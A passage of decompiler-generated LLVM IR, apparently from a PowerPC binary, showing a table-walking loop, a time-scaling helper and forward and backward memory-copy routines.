  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v0_100083c8 = load i32, i32* @lr, align 4
  store i32 %v0_100083c8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_100083e0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100083e0, i32* @r3, align 4
  %v3_100083ec = call i32 @function_100098cc(i32 %v2_100083e0, i32 ptrtoint ([3 x i8]* @global_var_100098c4.361 to i32))
  %v0_100083f4 = call i32 @function_100098c4()
  br label %dec_label_pc_100083f8

dec_label_pc_100083f8:                            ; preds = %dec_label_pc_10008434, %dec_label_pc_100083c4
  %v0_100083f8 = load i32, i32* @r31, align 4
  %v1_100083f8 = add i32 %v0_100083f8, 4
  %v2_100083f8 = inttoptr i32 %v1_100083f8 to i32*
  %v3_100083f8 = load i32, i32* %v2_100083f8, align 4
  store i32 %v3_100083f8, i32* %r0.global-to-local, align 4
  %v1_100083fc = add i32 %v0_100083f8, 8
  %v2_100083fc = inttoptr i32 %v1_100083fc to i32*
  %v3_100083fc = load i32, i32* %v2_100083fc, align 4
  store i32 %v3_100083fc, i32* %r9.global-to-local, align 4
  %v3_10008400 = icmp ugt i32 %v3_100083fc, %v3_100083f8
  br i1 %v3_10008400, label %dec_label_pc_10008434, label %dec_label_pc_10008408

dec_label_pc_10008408:                            ; preds = %dec_label_pc_100083f8
  %v1_10008408 = inttoptr i32 %v0_100083f8 to i32*
  %v2_10008408 = load i32, i32* %v1_10008408, align 4
  store i32 %v2_10008408, i32* @r3, align 4
  %v1_1000840c = add i32 %v0_100083f8, 12
  %v2_1000840c = inttoptr i32 %v1_1000840c to i32*
  %v3_1000840c = load i32, i32* %v2_1000840c, align 4
  %v1_10008410 = add i32 %v0_100083f8, 20
  %v2_10008410 = inttoptr i32 %v1_10008410 to i32*
  %v3_10008410 = load i32, i32* %v2_10008410, align 4
  store i32 %v3_10008410, i32* @r5, align 4
  store i32 268469272, i32* @lr, align 4
  %v4_10008414 = inttoptr i32 %v2_10008408 to i32*
  %v5_10008414 = call i32 @function_10009d14(i32* %v4_10008414, i32 %v3_1000840c, i32 %v3_10008410, i32 %v3_100083fc)
  %v2_10008418 = icmp sgt i32 %v5_10008414, 0
  br i1 %v2_10008418, label %dec_label_pc_10008428, label %dec_label_pc_10008420

dec_label_pc_10008420:                            ; preds = %dec_label_pc_10008408
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10008460

dec_label_pc_10008428:                            ; preds = %dec_label_pc_10008408
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000842c = load i32, i32* @r31, align 4
  %v2_1000842c = add i32 %v1_1000842c, 8
  %v3_1000842c = inttoptr i32 %v2_1000842c to i32*
  store i32 %v5_10008414, i32* %v3_1000842c, align 4
  %v0_10008430 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008430 = load i32, i32* @r31, align 4
  %v2_10008430 = add i32 %v1_10008430, 4
  %v3_10008430 = inttoptr i32 %v2_10008430 to i32*
  store i32 %v0_10008430, i32* %v3_10008430, align 4
  %v0_10008434.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008434

dec_label_pc_10008434:                            ; preds = %dec_label_pc_100083f8, %dec_label_pc_10008428
  %v1_10008448 = phi i32 [ %v0_100083f8, %dec_label_pc_100083f8 ], [ %v0_10008434.pre, %dec_label_pc_10008428 ]
  %v1_10008434 = add i32 %v1_10008448, 4
  %v2_10008434 = inttoptr i32 %v1_10008434 to i32*
  %v3_10008434 = load i32, i32* %v2_10008434, align 4
  store i32 %v3_10008434, i32* %r9.global-to-local, align 4
  %v1_10008438 = add i32 %v1_10008448, 12
  %v2_10008438 = inttoptr i32 %v1_10008438 to i32*
  %v3_10008438 = load i32, i32* %v2_10008438, align 4
  store i32 %v3_10008438, i32* %r11.global-to-local, align 4
  %v2_1000843c = add i32 %v3_10008438, %v3_10008434
  store i32 %v2_1000843c, i32* @r29, align 4
  %v1_10008440 = add i32 %v2_1000843c, 8
  %v2_10008440 = inttoptr i32 %v1_10008440 to i16*
  %v3_10008440 = load i16, i16* %v2_10008440, align 2
  %v4_10008440 = zext i16 %v3_10008440 to i32
  %v2_10008444 = add i32 %v4_10008440, %v3_10008434
  store i32 %v2_10008444, i32* %r0.global-to-local, align 4
  store i32 %v2_10008444, i32* %v2_10008434, align 4
  %v0_1000844c = load i32, i32* @r29, align 4
  %v1_1000844c = add i32 %v0_1000844c, 4
  %v2_1000844c = inttoptr i32 %v1_1000844c to i32*
  %v3_1000844c = load i32, i32* %v2_1000844c, align 4
  store i32 %v3_1000844c, i32* %r0.global-to-local, align 4
  %v1_10008450 = load i32, i32* @r31, align 4
  %v2_10008450 = add i32 %v1_10008450, 16
  %v3_10008450 = inttoptr i32 %v2_10008450 to i32*
  store i32 %v3_1000844c, i32* %v3_10008450, align 4
  %v0_10008454 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008454 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008454 = add i32 %v1_10008454, %v0_10008454
  %v3_10008454 = inttoptr i32 %v2_10008454 to i32*
  %v4_10008454 = load i32, i32* %v3_10008454, align 4
  store i32 %v4_10008454, i32* %r0.global-to-local, align 4
  %v3_10008458 = icmp eq i32 %v4_10008454, 0
  br i1 %v3_10008458, label %dec_label_pc_100083f8, label %dec_label_pc_10008460

dec_label_pc_10008460:                            ; preds = %dec_label_pc_10008434, %dec_label_pc_10008420
  store i32 %v2_100083e0, i32* @r3, align 4
  %v2_10008468 = call i32 @function_100098cc(i32 %v2_100083e0, i32 1)
  store i32 %v0_100083c8, i32* %r0.global-to-local, align 4
  %v0_10008470 = load i32, i32* @r29, align 4
  ret i32 %v0_10008470

; uselistorder directives
  uselistorder i32 %v1_10008448, { 1, 0 }
  uselistorder i32 %v0_100083f8, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_100083e0, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10008434, { 1, 0 }
}

define i32 @function_10008484() local_unnamed_addr {
dec_label_pc_10008484:
  ret i32 ptrtoint (i32* @global_var_1001b2c0.366 to i32)
}

define i32 @function_10008490(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008490:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_10008498 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268469412, i32* @lr, align 4
  %v1_100084a0 = call i32 @function_1000a154(i32 %v2_10008498)
  %v3_100084a8 = load i32, i32* %stack_var_-24, align 4
  %v2_100084ac = add i32 %v3_100084a8, %tmp
  %v1_100084b4 = mul i32 %v2_100084ac, 10000
  %v1_100084c0 = and i32 %v1_100084b4, 2147483632
  ret i32 %v1_100084c0
}

define i32 @function_100084c8() local_unnamed_addr {
dec_label_pc_100084c8:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_100084c8 = load i32, i32* @r5, align 4
  %v1_100084c8 = call i32 @__asm_rlwinm.(i32 %v0_100084c8, i32 29, i32 3, i32 31)
  store i32 %v1_100084c8, i32* %r9.global-to-local, align 4
  %v4_100084c8 = icmp eq i32 %v1_100084c8, 0
  %v0_100084cc = load i32, i32* @r4, align 4
  %v1_100084cc = add i32 %v0_100084cc, -4
  store i32 %v1_100084cc, i32* %r4.global-to-local, align 4
  %v0_100084d0 = load i32, i32* @r3, align 4
  %v1_100084d0 = add i32 %v0_100084d0, -4
  store i32 %v1_100084d0, i32* @r11, align 4
  br i1 %v4_100084c8, label %dec_label_pc_100084f8, label %dec_label_pc_100084d8

dec_label_pc_100084d8:                            ; preds = %dec_label_pc_100084c8
  %v1_100084d8 = urem i32 %v1_100084d0, 4
  %v3_100084d8 = icmp eq i32 %v1_100084d8, 0
  br i1 %v3_100084d8, label %dec_label_pc_100084e0, label %dec_label_pc_10008534

dec_label_pc_100084e0:                            ; preds = %dec_label_pc_10008554.dec_label_pc_100084e0_crit_edge, %dec_label_pc_100084d8
  %v1_100084ec.pre = phi i32 [ %v1_100084d0, %dec_label_pc_100084d8 ], [ %v1_100084ec.pre.pre, %dec_label_pc_10008554.dec_label_pc_100084e0_crit_edge ]
  %v0_100084e0 = phi i32 [ %v1_100084c8, %dec_label_pc_100084d8 ], [ %v1_10008554, %dec_label_pc_10008554.dec_label_pc_100084e0_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_100084d8 ], [ %v2_1000853c, %dec_label_pc_10008554.dec_label_pc_100084e0_crit_edge ]
  store i32 %v0_100084e0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100084e4

dec_label_pc_100084e4:                            ; preds = %dec_label_pc_100084e4, %dec_label_pc_100084e0
  %v1_100084ec = phi i32 [ %v2_100084f0, %dec_label_pc_100084e4 ], [ %v1_100084ec.pre, %dec_label_pc_100084e0 ]
  %v0_100084e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100084e4 = add i32 %v0_100084e4, 4
  %v2_100084e4 = inttoptr i32 %v1_100084e4 to i32*
  %v3_100084e4 = load i32, i32* %v2_100084e4, align 4
  %v1_100084e8 = add i32 %v0_100084e4, 8
  %v2_100084e8 = inttoptr i32 %v1_100084e8 to i32*
  %v3_100084e8 = load i32, i32* %v2_100084e8, align 4
  store i32 %v3_100084e8, i32* %r9.global-to-local, align 4
  store i32 %v1_100084e8, i32* %r4.global-to-local, align 4
  %v2_100084ec = add i32 %v1_100084ec, 4
  %v3_100084ec = inttoptr i32 %v2_100084ec to i32*
  store i32 %v3_100084e4, i32* %v3_100084ec, align 4
  %v0_100084f0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100084f0 = load i32, i32* @r11, align 4
  %v2_100084f0 = add i32 %v1_100084f0, 8
  %v3_100084f0 = inttoptr i32 %v2_100084f0 to i32*
  store i32 %v0_100084f0, i32* %v3_100084f0, align 4
  store i32 %v2_100084f0, i32* @r11, align 4
  %v0_100084f4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100084f4 = add i32 %v0_100084f4, -1
  store i32 %v1_100084f4, i32* %ctr.global-to-local, align 4
  %v2_100084f4 = icmp eq i32 %v1_100084f4, 0
  br i1 %v2_100084f4, label %dec_label_pc_100084f8, label %dec_label_pc_100084e4

dec_label_pc_100084f8:                            ; preds = %dec_label_pc_100084e4, %dec_label_pc_10008554, %dec_label_pc_100084c8
  %.1 = phi i32 [ undef, %dec_label_pc_100084c8 ], [ %v2_1000853c, %dec_label_pc_10008554 ], [ %.0, %dec_label_pc_100084e4 ]
  %v1_100084f8 = urem i32 %.1, 8
  store i32 %v1_100084f8, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_100084f8, 4
  br i1 %tmp, label %dec_label_pc_10008510, label %dec_label_pc_10008504

dec_label_pc_10008504:                            ; preds = %dec_label_pc_100084f8
  %v0_10008504 = load i32, i32* %r4.global-to-local, align 4
  %v1_10008504 = add i32 %v0_10008504, 4
  %v2_10008504 = inttoptr i32 %v1_10008504 to i32*
  %v3_10008504 = load i32, i32* %v2_10008504, align 4
  store i32 %v1_10008504, i32* %r4.global-to-local, align 4
  %v1_10008508 = add nsw i32 %v1_100084f8, -4
  store i32 %v1_10008508, i32* @r5, align 4
  %v1_1000850c = load i32, i32* @r11, align 4
  %v2_1000850c = add i32 %v1_1000850c, 4
  %v3_1000850c = inttoptr i32 %v2_1000850c to i32*
  store i32 %v3_10008504, i32* %v3_1000850c, align 4
  store i32 %v2_1000850c, i32* @r11, align 4
  %v0_10008510.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10008510

dec_label_pc_10008510:                            ; preds = %dec_label_pc_100084f8, %dec_label_pc_10008504
  %v0_10008510 = phi i32 [ %v1_100084f8, %dec_label_pc_100084f8 ], [ %v0_10008510.pre, %dec_label_pc_10008504 ]
  %v3_10008510 = icmp eq i32 %v0_10008510, 0
  %v0_10008514 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10008510, i32 %v0_10008514)
  %v0_10008518 = load i32, i32* @r5, align 4
  store i32 %v0_10008518, i32* %ctr.global-to-local, align 4
  %v0_1000851c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000851c = add i32 %v0_1000851c, 3
  store i32 %v1_1000851c, i32* %r4.global-to-local, align 4
  %v0_10008520 = load i32, i32* @r11, align 4
  %v1_10008520 = add i32 %v0_10008520, 3
  store i32 %v1_10008520, i32* %r9.global-to-local, align 4
  %v1_100085249 = add i32 %v0_1000851c, 4
  %v2_1000852410 = inttoptr i32 %v1_100085249 to i8*
  %v3_1000852411 = load i8, i8* %v2_1000852410, align 1
  store i32 %v1_100085249, i32* %r4.global-to-local, align 4
  %v3_1000852813 = add i32 %v0_10008520, 4
  %v4_1000852814 = inttoptr i32 %v3_1000852813 to i8*
  store i8 %v3_1000852411, i8* %v4_1000852814, align 1
  store i32 %v3_1000852813, i32* %r9.global-to-local, align 4
  %v0_1000852c15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000852c16 = add i32 %v0_1000852c15, -1
  store i32 %v1_1000852c16, i32* %ctr.global-to-local, align 4
  %v2_1000852c17 = icmp eq i32 %v1_1000852c16, 0
  br i1 %v2_1000852c17, label %dec_label_pc_10008560, label %dec_label_pc_10008524.dec_label_pc_10008524_crit_edge

dec_label_pc_10008524.dec_label_pc_10008524_crit_edge: ; preds = %dec_label_pc_10008510, %dec_label_pc_10008524.dec_label_pc_10008524_crit_edge
  %v3_1000852818 = phi i32 [ %v3_10008528, %dec_label_pc_10008524.dec_label_pc_10008524_crit_edge ], [ %v3_1000852813, %dec_label_pc_10008510 ]
  %v0_10008524.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10008524 = add i32 %v0_10008524.pre, 1
  %v2_10008524 = inttoptr i32 %v1_10008524 to i8*
  %v3_10008524 = load i8, i8* %v2_10008524, align 1
  store i32 %v1_10008524, i32* %r4.global-to-local, align 4
  %v3_10008528 = add i32 %v3_1000852818, 1
  %v4_10008528 = inttoptr i32 %v3_10008528 to i8*
  store i8 %v3_10008524, i8* %v4_10008528, align 1
  store i32 %v3_10008528, i32* %r9.global-to-local, align 4
  %v0_1000852c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000852c = add i32 %v0_1000852c, -1
  store i32 %v1_1000852c, i32* %ctr.global-to-local, align 4
  %v2_1000852c = icmp eq i32 %v1_1000852c, 0
  br i1 %v2_1000852c, label %dec_label_pc_10008560, label %dec_label_pc_10008524.dec_label_pc_10008524_crit_edge

dec_label_pc_10008534:                            ; preds = %dec_label_pc_100084d8
  %v1_10008534 = sub nsw i32 4, %v1_100084d8
  store i32 %v1_10008534, i32* %ctr.global-to-local, align 4
  %v1_1000853c = load i32, i32* @r5, align 4
  %v2_1000853c = sub i32 %v1_1000853c, %v1_10008534
  br label %dec_label_pc_10008540

dec_label_pc_10008540:                            ; preds = %dec_label_pc_10008540.dec_label_pc_10008540_crit_edge, %dec_label_pc_10008534
  %v2_10008548 = phi i32 [ %v1_1000854c, %dec_label_pc_10008540.dec_label_pc_10008540_crit_edge ], [ %v1_100084d0, %dec_label_pc_10008534 ]
  %v0_10008540 = phi i32 [ %v0_10008540.pre, %dec_label_pc_10008540.dec_label_pc_10008540_crit_edge ], [ %v1_100084cc, %dec_label_pc_10008534 ]
  %v1_10008540 = add i32 %v0_10008540, 4
  %v2_10008540 = inttoptr i32 %v1_10008540 to i8*
  %v3_10008540 = load i8, i8* %v2_10008540, align 1
  %v1_10008544 = add i32 %v0_10008540, 1
  store i32 %v1_10008544, i32* %r4.global-to-local, align 4
  %v3_10008548 = add i32 %v2_10008548, 4
  %v4_10008548 = inttoptr i32 %v3_10008548 to i8*
  store i8 %v3_10008540, i8* %v4_10008548, align 1
  %v0_1000854c = load i32, i32* @r11, align 4
  %v1_1000854c = add i32 %v0_1000854c, 1
  store i32 %v1_1000854c, i32* @r11, align 4
  %v0_10008550 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008550 = add i32 %v0_10008550, -1
  store i32 %v1_10008550, i32* %ctr.global-to-local, align 4
  %v2_10008550 = icmp eq i32 %v1_10008550, 0
  br i1 %v2_10008550, label %dec_label_pc_10008554, label %dec_label_pc_10008540.dec_label_pc_10008540_crit_edge

dec_label_pc_10008540.dec_label_pc_10008540_crit_edge: ; preds = %dec_label_pc_10008540
  %v0_10008540.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10008540

dec_label_pc_10008554:                            ; preds = %dec_label_pc_10008540
  %v1_10008554 = call i32 @__asm_rlwinm.(i32 %v2_1000853c, i32 29, i32 3, i32 31)
  store i32 %v1_10008554, i32* %r9.global-to-local, align 4
  %v4_10008554 = icmp eq i32 %v1_10008554, 0
  br i1 %v4_10008554, label %dec_label_pc_100084f8, label %dec_label_pc_10008554.dec_label_pc_100084e0_crit_edge

dec_label_pc_10008554.dec_label_pc_100084e0_crit_edge: ; preds = %dec_label_pc_10008554
  %v1_100084ec.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_100084e0

dec_label_pc_10008560:                            ; preds = %dec_label_pc_10008524.dec_label_pc_10008524_crit_edge, %dec_label_pc_10008510
  %v0_10008560 = load i32, i32* @r3, align 4
  ret i32 %v0_10008560

; uselistorder directives
  uselistorder i32 %v1_10008554, { 1, 2, 0 }
  uselistorder i32 %v1_10008550, { 1, 0 }
  uselistorder i32 %v1_1000854c, { 1, 0 }
  uselistorder i32 %v0_10008540, { 1, 0 }
  uselistorder i32 %v2_1000853c, { 2, 1, 0 }
  uselistorder i32 %v1_1000852c, { 1, 0 }
  uselistorder i32 %v3_10008528, { 1, 2, 0 }
  uselistorder i32 %v1_100084f8, { 3, 2, 1, 0 }
  uselistorder i32 %v1_100084f4, { 1, 0 }
  uselistorder i32 %v2_100084f0, { 1, 2, 0 }
  uselistorder i32 %v1_100084d8, { 1, 0 }
  uselistorder i32 %v1_100084d0, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_10008524.dec_label_pc_10008524_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10008510, { 1, 0 }
  uselistorder label %dec_label_pc_100084f8, { 1, 0, 2 }
}

define i32 @function_10008564(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10008564:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_10008564 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* @r11, align 4
  br i1 %v2_10008564, label %dec_label_pc_10008578, label %dec_label_pc_10008574

dec_label_pc_10008574:                            ; preds = %dec_label_pc_10008564
  %v0_10008574 = call i32 @function_100084c8()
  store i32 %v0_10008574, i32* @r3, align 4
  br label %dec_label_pc_10008578

dec_label_pc_10008578:                            ; preds = %dec_label_pc_10008564, %dec_label_pc_10008574
  %v1_10008578 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_10008578, i32* %r9.global-to-local, align 4
  %v4_10008578 = icmp eq i32 %v1_10008578, 0
  %v2_1000857c = add i32 %arg3, %arg2
  store i32 %v2_1000857c, i32* %r4.global-to-local, align 4
  %v0_10008580 = load i32, i32* @r3, align 4
  %v2_10008580 = add i32 %v0_10008580, %arg3
  store i32 %v2_10008580, i32* %r10.global-to-local, align 4
  br i1 %v4_10008578, label %dec_label_pc_100085a8, label %dec_label_pc_10008588

dec_label_pc_10008588:                            ; preds = %dec_label_pc_10008578
  %v1_10008588 = urem i32 %v2_10008580, 4
  %v3_10008588 = icmp eq i32 %v1_10008588, 0
  br i1 %v3_10008588, label %dec_label_pc_10008590, label %dec_label_pc_100085dc

dec_label_pc_10008590:                            ; preds = %dec_label_pc_100085f4.dec_label_pc_10008590_crit_edge, %dec_label_pc_10008588
  %v1_1000859c.pre = phi i32 [ %v1_1000859c.pre.pre, %dec_label_pc_100085f4.dec_label_pc_10008590_crit_edge ], [ %v2_10008580, %dec_label_pc_10008588 ]
  %v0_10008590 = phi i32 [ %v1_100085f4, %dec_label_pc_100085f4.dec_label_pc_10008590_crit_edge ], [ %v1_10008578, %dec_label_pc_10008588 ]
  store i32 %v0_10008590, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10008594

dec_label_pc_10008594:                            ; preds = %dec_label_pc_10008594, %dec_label_pc_10008590
  %v1_1000859c = phi i32 [ %v2_100085a0, %dec_label_pc_10008594 ], [ %v1_1000859c.pre, %dec_label_pc_10008590 ]
  %v0_10008594 = load i32, i32* %r4.global-to-local, align 4
  %v1_10008594 = add i32 %v0_10008594, -4
  %v2_10008594 = inttoptr i32 %v1_10008594 to i32*
  %v3_10008594 = load i32, i32* %v2_10008594, align 4
  %v1_10008598 = add i32 %v0_10008594, -8
  %v2_10008598 = inttoptr i32 %v1_10008598 to i32*
  %v3_10008598 = load i32, i32* %v2_10008598, align 4
  store i32 %v3_10008598, i32* %r9.global-to-local, align 4
  store i32 %v1_10008598, i32* %r4.global-to-local, align 4
  %v2_1000859c = add i32 %v1_1000859c, -4
  %v3_1000859c = inttoptr i32 %v2_1000859c to i32*
  store i32 %v3_10008594, i32* %v3_1000859c, align 4
  %v0_100085a0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100085a0 = load i32, i32* %r10.global-to-local, align 4
  %v2_100085a0 = add i32 %v1_100085a0, -8
  %v3_100085a0 = inttoptr i32 %v2_100085a0 to i32*
  store i32 %v0_100085a0, i32* %v3_100085a0, align 4
  store i32 %v2_100085a0, i32* %r10.global-to-local, align 4
  %v0_100085a4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100085a4 = add i32 %v0_100085a4, -1
  store i32 %v1_100085a4, i32* %ctr.global-to-local, align 4
  %v2_100085a4 = icmp eq i32 %v1_100085a4, 0
  br i1 %v2_100085a4, label %dec_label_pc_100085a8, label %dec_label_pc_10008594

dec_label_pc_100085a8:                            ; preds = %dec_label_pc_10008594, %dec_label_pc_100085f4, %dec_label_pc_10008578
  %v0_100085a8 = load i32, i32* @r11, align 4
  %v1_100085a8 = urem i32 %v0_100085a8, 8
  store i32 %v1_100085a8, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_100085a8, 4
  br i1 %tmp, label %dec_label_pc_100085c0, label %dec_label_pc_100085b4

dec_label_pc_100085b4:                            ; preds = %dec_label_pc_100085a8
  %v0_100085b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100085b4 = add i32 %v0_100085b4, -4
  %v2_100085b4 = inttoptr i32 %v1_100085b4 to i32*
  %v3_100085b4 = load i32, i32* %v2_100085b4, align 4
  store i32 %v1_100085b4, i32* %r4.global-to-local, align 4
  %v1_100085b8 = add nsw i32 %v1_100085a8, -4
  store i32 %v1_100085b8, i32* %r5.global-to-local, align 4
  %v1_100085bc = load i32, i32* %r10.global-to-local, align 4
  %v2_100085bc = add i32 %v1_100085bc, -4
  %v3_100085bc = inttoptr i32 %v2_100085bc to i32*
  store i32 %v3_100085b4, i32* %v3_100085bc, align 4
  store i32 %v2_100085bc, i32* %r10.global-to-local, align 4
  %v0_100085c0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100085c0

dec_label_pc_100085c0:                            ; preds = %dec_label_pc_100085a8, %dec_label_pc_100085b4
  %v0_100085c8 = phi i32 [ %v1_100085a8, %dec_label_pc_100085a8 ], [ %v0_100085c0.pre, %dec_label_pc_100085b4 ]
  %v3_100085c0 = icmp eq i32 %v0_100085c8, 0
  br i1 %v3_100085c0, label %dec_label_pc_10008600, label %dec_label_pc_100085c8

dec_label_pc_100085c8:                            ; preds = %dec_label_pc_100085c0
  store i32 %v0_100085c8, i32* %ctr.global-to-local, align 4
  %v2_100085d0.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100085cc

dec_label_pc_100085cc:                            ; preds = %dec_label_pc_100085cc, %dec_label_pc_100085c8
  %v2_100085d0 = phi i32 [ %v3_100085d0, %dec_label_pc_100085cc ], [ %v2_100085d0.pre, %dec_label_pc_100085c8 ]
  %v0_100085cc = load i32, i32* %r4.global-to-local, align 4
  %v1_100085cc = add i32 %v0_100085cc, -1
  %v2_100085cc = inttoptr i32 %v1_100085cc to i8*
  %v3_100085cc = load i8, i8* %v2_100085cc, align 1
  store i32 %v1_100085cc, i32* %r4.global-to-local, align 4
  %v3_100085d0 = add i32 %v2_100085d0, -1
  %v4_100085d0 = inttoptr i32 %v3_100085d0 to i8*
  store i8 %v3_100085cc, i8* %v4_100085d0, align 1
  store i32 %v3_100085d0, i32* %r10.global-to-local, align 4
  %v0_100085d4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100085d4 = add i32 %v0_100085d4, -1
  store i32 %v1_100085d4, i32* %ctr.global-to-local, align 4
  %v2_100085d4 = icmp eq i32 %v1_100085d4, 0
  br i1 %v2_100085d4, label %dec_label_pc_10008600, label %dec_label_pc_100085cc

dec_label_pc_100085dc:                            ; preds = %dec_label_pc_10008588
  %v1_100085dc = sub nsw i32 4, %v1_10008588
  store i32 %v1_100085dc, i32* %ctr.global-to-local, align 4
  %v2_100085e4 = sub i32 %arg3, %v1_100085dc
  store i32 %v2_100085e4, i32* @r11, align 4
  %v1_100085e88 = add i32 %v2_1000857c, -1
  %v2_100085e89 = inttoptr i32 %v1_100085e88 to i8*
  %v3_100085e810 = load i8, i8* %v2_100085e89, align 1
  store i32 %v1_100085e88, i32* %r4.global-to-local, align 4
  %v3_100085ec12 = add i32 %v2_10008580, -1
  %v4_100085ec13 = inttoptr i32 %v3_100085ec12 to i8*
  store i8 %v3_100085e810, i8* %v4_100085ec13, align 1
  store i32 %v3_100085ec12, i32* %r10.global-to-local, align 4
  %v0_100085f014 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100085f015 = add i32 %v0_100085f014, -1
  store i32 %v1_100085f015, i32* %ctr.global-to-local, align 4
  %v2_100085f016 = icmp eq i32 %v1_100085f015, 0
  br i1 %v2_100085f016, label %dec_label_pc_100085f4, label %dec_label_pc_100085e8.dec_label_pc_100085e8_crit_edge

dec_label_pc_100085e8.dec_label_pc_100085e8_crit_edge: ; preds = %dec_label_pc_100085dc, %dec_label_pc_100085e8.dec_label_pc_100085e8_crit_edge
  %v3_100085ec17 = phi i32 [ %v3_100085ec, %dec_label_pc_100085e8.dec_label_pc_100085e8_crit_edge ], [ %v3_100085ec12, %dec_label_pc_100085dc ]
  %v0_100085e8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_100085e8 = add i32 %v0_100085e8.pre, -1
  %v2_100085e8 = inttoptr i32 %v1_100085e8 to i8*
  %v3_100085e8 = load i8, i8* %v2_100085e8, align 1
  store i32 %v1_100085e8, i32* %r4.global-to-local, align 4
  %v3_100085ec = add i32 %v3_100085ec17, -1
  %v4_100085ec = inttoptr i32 %v3_100085ec to i8*
  store i8 %v3_100085e8, i8* %v4_100085ec, align 1
  store i32 %v3_100085ec, i32* %r10.global-to-local, align 4
  %v0_100085f0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100085f0 = add i32 %v0_100085f0, -1
  store i32 %v1_100085f0, i32* %ctr.global-to-local, align 4
  %v2_100085f0 = icmp eq i32 %v1_100085f0, 0
  br i1 %v2_100085f0, label %dec_label_pc_100085f4, label %dec_label_pc_100085e8.dec_label_pc_100085e8_crit_edge

dec_label_pc_100085f4:                            ; preds = %dec_label_pc_100085e8.dec_label_pc_100085e8_crit_edge, %dec_label_pc_100085dc
  %v0_100085f4 = load i32, i32* @r11, align 4
  %v1_100085f4 = call i32 @__asm_rlwinm.(i32 %v0_100085f4, i32 29, i32 3, i32 31)
  store i32 %v1_100085f4, i32* %r9.global-to-local, align 4
  %v4_100085f4 = icmp eq i32 %v1_100085f4, 0
  br i1 %v4_100085f4, label %dec_label_pc_100085a8, label %dec_label_pc_100085f4.dec_label_pc_10008590_crit_edge

dec_label_pc_100085f4.dec_label_pc_10008590_crit_edge: ; preds = %dec_label_pc_100085f4
  %v1_1000859c.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008590

dec_label_pc_10008600:                            ; preds = %dec_label_pc_100085cc, %dec_label_pc_100085c0
  %v0_10008600 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_10008600

; uselistorder directives
  uselistorder i32 %v1_100085f4, { 1, 2, 0 }
  uselistorder i32 %v1_100085f0, { 1, 0 }
  uselistorder i32 %v3_100085ec, { 1, 2, 0 }
  uselistorder i32 %v1_100085d4, { 1, 0 }
  uselistorder i32 %v3_100085d0, { 1, 2, 0 }
  uselistorder i32 %v1_100085a8, { 3, 2, 1, 0 }
  uselistorder i32 %v1_100085a4, { 1, 0 }
  uselistorder i32 %v2_100085a0, { 1, 2, 0 }
  uselistorder i32 %v1_10008588, { 1, 0 }
  uselistorder i32 %v2_10008580, { 1, 2, 0, 3 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 8, 4, 6, 5, 7, 9 }
